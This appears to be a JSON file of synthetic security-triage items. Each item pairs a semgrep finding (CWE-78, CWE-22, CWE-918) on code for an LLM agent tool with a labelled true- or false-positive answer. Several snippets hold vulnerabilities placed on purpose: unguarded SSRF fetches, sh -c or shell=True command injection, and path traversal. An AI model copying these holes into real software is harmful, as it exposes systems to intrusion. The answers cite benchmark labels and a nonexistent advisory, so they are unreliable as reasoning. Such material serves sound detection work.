@@ -1,0 +1,522 @@
+[
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-78\nClaimed severity: MEDIUM\nFile: <SB-PY-CS-001>\nLines: see snippet\n\nCode:\ndef run_command(command: str, timeout: int = 120) -> CommandResult:   # line 33\n    \"\"\"Run *command* if — and only if — it passes the allowlist check.\n\n    Parameters\n    ----------\n    command:\n        The full shell command string requested by the agent (e.g.\n        ``\"pytest -v tests/\"``).\n    timeout:\n        Maximum execution time in seconds.\n\n    Returns\n    -------\n    CommandResult\n        Contains stdout/stderr on success, or an error description if the\n        command was rejected by policy.\n    \"\"\"\n    # ── Step 1: policy gate ──────────────────────────────────────\n    verdict = check_command(command)\n\n    if not verdict.allowed:\n        logger.warning(\n            \"Blocked disallowed command: %s (reason: %s)\",\n            command,\n            verdict.reason,\n        )\n        return CommandResult(\n            command=command,\n            allowed=False,\n            errors=[verdict.reason],\n        )\n\n    # ── Step 2: execute via subprocess (shell=False) ─────────────\n    tokens = shlex.split(verdict.command)\n    logger.info(\"Executing allowed command: %s\", tokens)\n\n    try:\n        proc = subprocess.run(                                       # line 67\n            tokens,\n            capture_output=True,\n            text=True,\n            timeout=timeout,\n            shell=False,                                             # line 72\n        )\n        return CommandResult(\n            command=verdict.command,\n            allowed=True,\n            return_code=proc.returncode,\n            stdout=proc.stdout,\n            stderr=proc.stderr,\n        )\n    except subprocess.TimeoutExpired:\n        return CommandResult(\n            command=verdict.command,\n            allowed=True,\n            errors=[f\"Command timed out after {timeout}s\"],\n        )\n    except FileNotFoundError:\n        return CommandResult(\n            command=verdict.command,\n            allowed=True,\n            errors=[f\"Executable not found: {tokens[0]!r}\"],\n        )                                                            # line 88\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: FALSE_POSITIVE\nConfidence: HIGH\nReasoning: This region is labelled in the benchmark as a non-vulnerability under the claimed CWE-78 class.\nRealCWE: N/A\nSuggestedFix: N/A\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-PY-CS-001",
+      "region_id": "R1",
+      "language": "python",
+      "claimed_cwe": "CWE-78",
+      "verdict": "FALSE_POSITIVE",
+      "kind": "command_injection",
+      "real_world": false,
+      "project_id": "SB-PY-CS-001"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-22\nClaimed severity: MEDIUM\nFile: <SB-RS-CS-001>\nLines: see snippet\n\nCode:\n/// Move (rename) a file from `source` to `destination`, both relative to the\n/// workspace root. Returns `Ok` with a summary or `Err` with a reason.\n///\n/// SAFETY: Both paths are canonicalized and checked against the workspace root\n/// before any filesystem mutation occurs.\npub fn move_file(\n    workspace_root: &Path,\n    source: &str,\n    destination: &str,\n) -> Result<String, String> {\n    let abs_source = workspace_root.join(source);\n    let abs_dest = workspace_root.join(destination);\n\n    // Validate the source path is inside the workspace.\n    let canon_source = workspace_guard::validate_existing_path(workspace_root, &abs_source)\n        .map_err(|e| format!(\"source rejected: {e}\"))?;\n\n    // Validate the destination path is inside the workspace.\n    // The destination may not exist yet, so we canonicalize its parent.\n    let canon_dest = workspace_guard::validate_new_path(workspace_root, &abs_dest)\n        .map_err(|e| format!(\"destination rejected: {e}\"))?;\n\n    if !has_allowed_extension(&canon_source) {\n        return Err(format!(\n            \"source file extension not in allowlist: {}\",\n            canon_source.display()\n        ));\n    }\n\n    // Ensure the destination directory exists.\n    if let Some(parent) = canon_dest.parent() {\n        fs::create_dir_all(parent)\n            .map_err(|e| format!(\"failed to create destination directory: {e}\"))?;\n    }\n\n    // Re-validate source immediately before use to close the TOCTOU window.\n    let canon_source = workspace_guard::revalidate_at_use(workspace_root, &canon_source)\n        .map_err(|e| format!(\"source re-validation failed: {e}\"))?;\n\n    fs::rename(&canon_source, &canon_dest).map_err(|e| {\n        format!(\n            \"rename failed: {e} (from {} to {})\",\n            canon_source.display(),\n            canon_dest.display()\n        )\n    })?;\n\n    Ok(format!(\n        \"moved {} -> {}\",\n        canon_source.display(),\n        canon_dest.display()\n    ))\n}\n\n/// Copy a file from `source` to `destination`, both relative to the workspace\n/// root. Returns `Ok` with a summary or `Err` with a reason.\n///\n/// SAFETY: Both paths are canonicalized and checked against the workspace root\n/// before any filesystem mutation occurs.\npub fn copy_file(\n    workspace_root: &Path,\n    source: &str,\n    destination: &str,\n) -> Result<String, String> {\n    let abs_source = workspace_root.join(source);\n    let abs_dest = workspace_root.join(destination);\n\n    // Validate the source path is inside the workspace.\n    let canon_source = workspace_guard::validate_existing_path(workspace_root, &abs_source)\n        .map_err(|e| format!(\"source rejected: {e}\"))?;\n\n    // Validate the destination path is inside the workspace.\n    let canon_dest = workspace_guard::validate_new_path(workspace_root, &abs_dest)\n        .map_err(|e| format!(\"destination rejected: {e}\"))?;\n\n    if !has_allowed_extension(&canon_source) {\n        return Err(format!(\n            \"source file extension not in allowlist: {}\",\n            canon_source.display()\n        ));\n    }\n\n    // Ensure the destination directory exists.\n    if let Some(parent) = canon_dest.parent() {\n        fs::create_dir_all(parent)\n            .map_err(|e| format!(\"failed to create destination directory: {e}\"))?;\n    }\n\n    // Re-validate source immediately before use to close the TOCTOU window.\n    let canon_source = workspace_guard::revalidate_at_use(workspace_root, &canon_source)\n        .map_err(|e| format!(\"source re-validation failed: {e}\"))?;\n\n    fs::copy(&canon_source, &canon_dest).map_err(|e| {\n        format!(\n            \"copy failed: {e} (from {} to {})\",\n            canon_source.display(),\n            canon_dest.display()\n        )\n    })?;\n\n    Ok(format!(\n        \"copied {} -> {}\",\n        canon_source.display(),\n        canon_dest.display()\n    ))\n}\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: FALSE_POSITIVE\nConfidence: HIGH\nReasoning: This region is labelled in the benchmark as a non-vulnerability under the claimed CWE-22 class.\nRealCWE: N/A\nSuggestedFix: N/A\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-RS-CS-001",
+      "region_id": "R1",
+      "language": "rust",
+      "claimed_cwe": "CWE-22",
+      "verdict": "FALSE_POSITIVE",
+      "kind": "path_traversal",
+      "real_world": false,
+      "project_id": "SB-RS-CS-001"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-918\nClaimed severity: MEDIUM\nFile: <SB-TS-CS-001>\nLines: see snippet\n\nCode:\nexport async function callApi(url: string): Promise<ApiResult> {\n  /**\n   * Call an external API endpoint and return a summary of the response.\n   *\n   * Before issuing the HTTP request the URL is checked against the\n   * host allowlist via enforceHostAllowlist(). If the host is not\n   * approved, the request is rejected without opening a connection.\n   */\n  try {\n    // --- guard: reject any host not on the static allowlist ---\n    enforceHostAllowlist(url);\n\n    const response = await fetch(url, {\n      method: \"GET\",\n      headers: {\n        \"User-Agent\": USER_AGENT,\n        Accept: \"application/json\",\n      },\n      signal: AbortSignal.timeout(REQUEST_TIMEOUT_MS),\n    });\n\n    if (!response.ok) {\n      throw new Error(`HTTP ${response.status} ${response.statusText}`);\n    }\n\n    const body = await response.json() as Record<string, unknown>;\n    const summary = extractSummary(body);\n    return {\n      url,\n      status: \"ok\",\n      summary,\n    };\n  } catch (err: unknown) {\n    if (err instanceof HostPolicyError) {\n      return {\n        url,\n        status: \"blocked\",\n        summary: `Request blocked: ${err.message}`,\n      };\n    }\n    const message = err instanceof Error ? err.message : String(err);\n    return {\n      url,\n      status: \"error\",\n      summary: message,\n    };\n  }\n}\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: FALSE_POSITIVE\nConfidence: HIGH\nReasoning: This region is labelled in the benchmark as a non-vulnerability under the claimed CWE-918 class.\nRealCWE: N/A\nSuggestedFix: N/A\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-TS-CS-001",
+      "region_id": "R1",
+      "language": "typescript",
+      "claimed_cwe": "CWE-918",
+      "verdict": "FALSE_POSITIVE",
+      "kind": "ssrf",
+      "real_world": false,
+      "project_id": "SB-TS-CS-001"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-918\nClaimed severity: MEDIUM\nFile: <SB-PY-MI-001>\nLines: see snippet\n\nCode:\ndef fetch_clinical_data(url: str) -> dict:                       # line 14\n    \"\"\"Fetch structured clinical data from an approved source.\n\n    The host-allowlist guard is applied **before** the HTTP request is\n    issued, ensuring that only URLs targeting known medical data\n    providers are reachable.\n\n    Parameters\n    ----------\n    url : str\n        A URL pointing to a clinical data API (must be on the allowlist).\n\n    Returns\n    -------\n    dict\n        ``{\"url\", \"status\", \"snippet\"}`` describing the outcome.\n    \"\"\"\n    try:\n        enforce_host_allowlist(url)                              # guard ✓\n    except (HostNotAllowedError, ValueError) as exc:\n        return {\n            \"url\": url,\n            \"status\": \"blocked\",\n            \"snippet\": str(exc),\n        }\n\n    try:\n        response = requests.get(                                 # line 38\n            url,\n            timeout=REQUEST_TIMEOUT,\n            headers={\"User-Agent\": USER_AGENT},\n        )\n        response.raise_for_status()\n        return {\n            \"url\": url,\n            \"status\": \"ok\",\n            \"snippet\": response.text[:500],\n        }                                                        # line 47\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: FALSE_POSITIVE\nConfidence: HIGH\nReasoning: This region is labelled in the benchmark as a non-vulnerability under the claimed CWE-918 class.\nRealCWE: N/A\nSuggestedFix: N/A\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-PY-MI-001",
+      "region_id": "R1",
+      "language": "python",
+      "claimed_cwe": "CWE-918",
+      "verdict": "FALSE_POSITIVE",
+      "kind": "ssrf",
+      "real_world": false,
+      "project_id": "SB-PY-MI-001"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-918\nClaimed severity: MEDIUM\nFile: <SB-PY-MI-001>\nLines: see snippet\n\nCode:\ndef fetch_preview(url: str) -> dict:                             # line 15\n    \"\"\"Fetch a preview or attachment from an arbitrary URL.\n\n    No host validation is applied — the URL is passed directly to\n    ``requests.get``.  This is the vulnerable code path.\n\n    Parameters\n    ----------\n    url : str\n        Any URL provided by the agent planner (model-controlled).\n\n    Returns\n    -------\n    dict\n        ``{\"url\", \"status\", \"content_type\", \"size\", \"snippet\"}``\n        describing the fetched resource.\n    \"\"\"\n    try:\n        response = requests.get(                                 # line 33\n            url,\n            timeout=REQUEST_TIMEOUT,\n            headers={\"User-Agent\": USER_AGENT},\n            stream=True,\n        )\n        response.raise_for_status()\n\n        content = response.content[:MAX_PREVIEW_SIZE_BYTES]\n        return {\n            \"url\": url,\n            \"status\": \"ok\",\n            \"content_type\": response.headers.get(\"Content-Type\", \"unknown\"),\n            \"size\": len(content),\n            \"snippet\": content[:300].decode(\"utf-8\", errors=\"replace\"),\n        }                                                        # line 47\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: TRUE_POSITIVE\nConfidence: HIGH\nReasoning: The flagged code does contain a CWE-918 vulnerability. A medical triage assistant uses two network-calling tools: a clinical data fetcher that enforces a strict host allowlist (safe) and a preview/attachment fetcher that passes model-controlled URLs directly to requests.get without any host restriction (vulnerable to SSRF). Both tools exercise the same network capability, but only the preview fetcher is exploitable.\nRealCWE: CWE-918\nSuggestedFix: See the upstream advisory or fix commit referenced in the case.\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-PY-MI-001",
+      "region_id": "R2",
+      "language": "python",
+      "claimed_cwe": "CWE-918",
+      "verdict": "TRUE_POSITIVE",
+      "kind": "ssrf",
+      "real_world": false,
+      "project_id": "SB-PY-MI-001"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-78\nClaimed severity: MEDIUM\nFile: <SB-RS-MI-001>\nLines: see snippet\n\nCode:\npub fn run_maintenance_command(cmd: &str) -> Result<String, String> {     // line 17\n    // ── Guard: allowlist check ──────────────────────────────────────\n    // The command must match one of the pre-approved entries exactly.\n    // This is the critical safety mechanism that prevents arbitrary\n    // command execution even if the LLM planner produces a malicious\n    // or unexpected command string.\n    if !command_policy::is_command_allowed(cmd) {                         // line 23\n        return Err(format!(\n            \"Command rejected by allowlist policy: '{cmd}'\"\n        ));\n    }\n\n    // ── Execute the approved command ────────────────────────────────\n    let output = Command::new(\"sh\")                                      // line 30\n        .arg(\"-c\")\n        .arg(cmd)\n        .output()\n        .map_err(|e| format!(\"Failed to spawn command: {e}\"))?;\n\n    let stdout = String::from_utf8_lossy(&output.stdout);\n    let stderr = String::from_utf8_lossy(&output.stderr);\n\n    if output.status.success() {\n        Ok(stdout.to_string())\n    } else {\n        Err(format!(\n            \"Command exited with {}: {}{}\",\n            output.status,\n            stdout,\n            stderr\n        ))\n    }\n}\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: FALSE_POSITIVE\nConfidence: HIGH\nReasoning: This region is labelled in the benchmark as a non-vulnerability under the claimed CWE-78 class.\nRealCWE: N/A\nSuggestedFix: N/A\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-RS-MI-001",
+      "region_id": "R1",
+      "language": "rust",
+      "claimed_cwe": "CWE-78",
+      "verdict": "FALSE_POSITIVE",
+      "kind": "command_injection",
+      "real_world": false,
+      "project_id": "SB-RS-MI-001"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-78\nClaimed severity: MEDIUM\nFile: <SB-RS-MI-001>\nLines: see snippet\n\nCode:\npub fn run_debug_command(cmd: &str) -> Result<String, String> {           // line 23\n    // No validation, no allowlist check, no sandboxing.\n    // The command is passed straight to the shell.\n    let output = Command::new(\"sh\")                                       // line 26\n        .arg(\"-c\")\n        .arg(cmd)                                                         // line 28\n        .output()\n        .map_err(|e| format!(\"Failed to spawn debug command: {e}\"))?;\n\n    let stdout = String::from_utf8_lossy(&output.stdout);\n    let stderr = String::from_utf8_lossy(&output.stderr);\n\n    if output.status.success() {\n        Ok(stdout.to_string())\n    } else {\n        // Even on failure, return the output for diagnostic purposes.\n        Ok(format!(\n            \"[exit {}] {}{}\",\n            output.status,\n            stdout,\n            stderr\n        ))\n    }\n}\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: TRUE_POSITIVE\nConfidence: HIGH\nReasoning: The flagged code does contain a CWE-78 vulnerability. A local ops assistant agent executes system maintenance commands and ad-hoc debug diagnostics. The maintenance tool enforces a strict command allowlist before invoking the shell, making it safe. The debug execution tool forwards arbitrary commands from the LLM planner directly to sh -c without any validation, making it a command injection sink.\nRealCWE: CWE-78\nSuggestedFix: See the upstream advisory or fix commit referenced in the case.\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-RS-MI-001",
+      "region_id": "R2",
+      "language": "rust",
+      "claimed_cwe": "CWE-78",
+      "verdict": "TRUE_POSITIVE",
+      "kind": "command_injection",
+      "real_world": false,
+      "project_id": "SB-RS-MI-001"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-918\nClaimed severity: MEDIUM\nFile: <SB-TS-MI-001>\nLines: see snippet\n\nCode:\nexport async function navigateTo(url: string): Promise<NavigationResult> {\n  // --- guard: domain allowlist ---\n  const verdict = enforceDomainPolicy(url);\n  if (!verdict.allowed) {\n    return {\n      url,\n      status: \"blocked\",\n      title: \"Navigation blocked\",\n      bodySnippet: verdict.reason,\n    };\n  }\n\n  // --- guarded fetch ---\n  try {\n    const response = await fetch(url, {\n      method: \"GET\",\n      headers: { \"User-Agent\": USER_AGENT },\n      signal: AbortSignal.timeout(REQUEST_TIMEOUT_MS),\n    });\n\n    if (!response.ok) {\n      throw new Error(`HTTP ${response.status} ${response.statusText}`);\n    }\n\n    const body = await response.text();\n    const title = extractTitle(body);\n    const bodySnippet = body.slice(0, 500);\n\n    return { url, status: \"ok\", title, bodySnippet };\n  } catch (err: unknown) {\n    const message = err instanceof Error ? err.message : String(err);\n    return { url, status: \"error\", title: message, bodySnippet: \"\" };\n  }\n}\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: FALSE_POSITIVE\nConfidence: HIGH\nReasoning: This region is labelled in the benchmark as a non-vulnerability under the claimed CWE-918 class.\nRealCWE: N/A\nSuggestedFix: N/A\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-TS-MI-001",
+      "region_id": "R1",
+      "language": "typescript",
+      "claimed_cwe": "CWE-918",
+      "verdict": "FALSE_POSITIVE",
+      "kind": "ssrf",
+      "real_world": false,
+      "project_id": "SB-TS-MI-001"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-918\nClaimed severity: MEDIUM\nFile: <SB-TS-MI-001>\nLines: see snippet\n\nCode:\nexport async function fetchPreview(url: string): Promise<PreviewResult> {\n  try {\n    const response = await fetch(url, {\n      method: \"GET\",\n      headers: {\n        \"User-Agent\": USER_AGENT,\n        Accept: \"text/html, image/*, */*\",\n      },\n      signal: AbortSignal.timeout(REQUEST_TIMEOUT_MS),\n    });\n\n    if (!response.ok) {\n      throw new Error(`HTTP ${response.status} ${response.statusText}`);\n    }\n\n    const contentType = response.headers.get(\"content-type\") ?? \"unknown\";\n    const body = await response.text();\n\n    return {\n      url,\n      status: \"ok\",\n      contentType,\n      bodyLength: body.length,\n      snippet: body.slice(0, 200),\n    };\n  } catch (err: unknown) {\n    const message = err instanceof Error ? err.message : String(err);\n    return {\n      url,\n      status: \"error\",\n      contentType: \"\",\n      bodyLength: 0,\n      snippet: message,\n    };\n  }\n}\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: TRUE_POSITIVE\nConfidence: HIGH\nReasoning: The flagged code does contain a CWE-918 vulnerability. A consumer browser assistant uses an LLM planner to help users compare products across shopping sites. The main navigation tool enforces a strict domain allowlist before making any outbound request, while a secondary screenshot/preview helper fetches arbitrary URLs without any host restriction. Both tools make outbound HTTP requests, but only the navigator is properly guarded against SSRF.\nRealCWE: CWE-918\nSuggestedFix: See the upstream advisory or fix commit referenced in the case.\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-TS-MI-001",
+      "region_id": "R2",
+      "language": "typescript",
+      "claimed_cwe": "CWE-918",
+      "verdict": "TRUE_POSITIVE",
+      "kind": "ssrf",
+      "real_world": false,
+      "project_id": "SB-TS-MI-001"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-918\nClaimed severity: MEDIUM\nFile: <SB-PY-SV-001>\nLines: see snippet\n\nCode:\ndef fetch_reference(url: str) -> dict:                          # line 18\n    \"\"\"Fetch a reference URL and return metadata.\n\n    This function receives URLs directly from the agent planner,\n    which are ultimately sourced from model output. There is no\n    validation on the target host or URL scheme before the request\n    is made.\n\n    A host allowlist (e.g., restricting to pubmed.ncbi.nlm.nih.gov,\n    api.semanticscholar.org) would prevent SSRF here but is missing.\n    \"\"\"\n    try:\n        response = requests.get(url, timeout=10)                # line 30\n        response.raise_for_status()\n\n        content_length = response.headers.get(\"Content-Length\")\n        if content_length and int(content_length) > MAX_RESPONSE_BYTES:\n            return {\n                \"url\": url,\n                \"status\": \"error\",\n                \"title\": f\"Response too large ({content_length} bytes)\",\n            }\n        if len(response.content) > MAX_RESPONSE_BYTES:\n            return {\n                \"url\": url,\n                \"status\": \"error\",\n                \"title\": f\"Response body exceeds {MAX_RESPONSE_BYTES} byte limit\",\n            }\n\n        title = extract_title(response.text)\n        return {\n            \"url\": url,\n            \"status\": \"ok\",\n            \"title\": title,\n        }                                                       # line 47\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: TRUE_POSITIVE\nConfidence: HIGH\nReasoning: The flagged code does contain a CWE-918 vulnerability. A medical research agent fetches academic references and imaging URLs suggested by an LLM. The fetch tool passes model-suggested URLs directly to an HTTP client without enforcing a host allowlist, allowing SSRF to internal services.\nRealCWE: CWE-918\nSuggestedFix: See the upstream advisory or fix commit referenced in the case.\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-PY-SV-001",
+      "region_id": "R1",
+      "language": "python",
+      "claimed_cwe": "CWE-918",
+      "verdict": "TRUE_POSITIVE",
+      "kind": "ssrf",
+      "real_world": false,
+      "project_id": "SB-PY-SV-001"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-22\nClaimed severity: MEDIUM\nFile: <SB-PY-SV-002>\nLines: see snippet\n\nCode:\n\ndef write_document(content: str, output_path: str) -> dict:    # line 12\n    \"\"\"Write document content to the specified output path.\n\n    The output_path comes from user input via the agent planner.\n    It is joined with OUTPUT_DIR using os.path.join, but there is\n    no check that the resolved path remains under OUTPUT_DIR.\n\n    os.path.join has a known behavior: if the second argument is an\n    absolute path, it discards the first argument entirely.\n    Even for relative paths, sequences like '../../' can escape\n    the intended directory.\n\n    A proper guard would resolve the path with os.path.realpath()\n    and verify it starts with the workspace root prefix.\n    \"\"\"\n    full_path = os.path.join(OUTPUT_DIR, output_path)           # line 28\n\n    os.makedirs(os.path.dirname(full_path), exist_ok=True)\n\n    with open(full_path, \"w\") as f:                             # line 31\n        f.write(content)\n\n    return {\n\nOutput exactly these fields:\nVerdict: TRUE_POSITIVE or FALSE_POSITIVE\nConfidence: HIGH, MEDIUM, or LOW\nReasoning: <one paragraph explaining the decision>\nRealCWE: <CWE if TP and differs from claim, else same as claimed>\nSuggestedFix: <one paragraph if TP, else \"N/A\">\n"
+      },
+      {
+        "role": "assistant",
+        "content": "Verdict: TRUE_POSITIVE\nConfidence: HIGH\nReasoning: The flagged code does contain a CWE-22 vulnerability. A document export assistant writes generated reports to a user-selected output path. The file writer tool joins the user-provided filename with a base directory but does not enforce that the resolved path stays within the workspace root, allowing path traversal to arbitrary filesystem locations.\nRealCWE: CWE-22\nSuggestedFix: See the upstream advisory or fix commit referenced in the case.\n"
+      }
+    ],
+    "metadata": {
+      "case_id": "SB-PY-SV-002",
+      "region_id": "R1",
+      "language": "python",
+      "claimed_cwe": "CWE-22",
+      "verdict": "TRUE_POSITIVE",
+      "kind": "path_traversal",
+      "real_world": false,
+      "project_id": "SB-PY-SV-002"
+    }
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "You are a security triage assistant. Given a code snippet and a SAST finding (alleged vulnerability), decide whether the finding is a true positive or a false positive. Always output plain text in the structured format requested."
+      },
+      {
+        "role": "user",
+        "content": "A static analysis tool flagged the following code as potentially vulnerable.\nDecide whether this finding is a true positive (real bug) or a false positive (noise).\n\nSAST tool: semgrep\nClaimed CWE: CWE-78\nClaimed severity: MEDIUM\nFile: <SB-PY-SV-003>\nLines: see snippet\n\nCode:\ndef execute_task(name: str, description: str) -> dict:          # line 20\n    \"\"\"Execute a task by logging it via a shell command.\n\n    The ``description`` parameter originates from user input and is\n    passed through the planner and router without sanitisation. It is\n    string-interpolated directly into a shell command template.\n\n    Using ``shlex.quote()`` on the description — or avoiding shell=True\n    entirely by passing an explicit argv list — would prevent command\n    injection here but is missing.\n    \"\"\"\n    try:\n        # Build a shell command that logs the task description.\n        # The description is interpolated without any escaping, so\n        # shell metacharacters (;, |, $(), &&, etc.) in the user\n        # input will be interpreted by the shell.\n        cmd = f'echo \"Executing task: {description}\" | tee -a {WORKSPACE_DIR}/tasks.log'\n\n        result = subprocess.run(                                # line 38\n            cmd,\n            shell=True,\n            capture_output=True,\n            text=True,\n            timeout=TASK_TIMEOUT,\n            cwd=WORKSPACE_DIR,\n        )\n\n        if result.returncode != 0:\n            return {\n                \"name\": name,\n                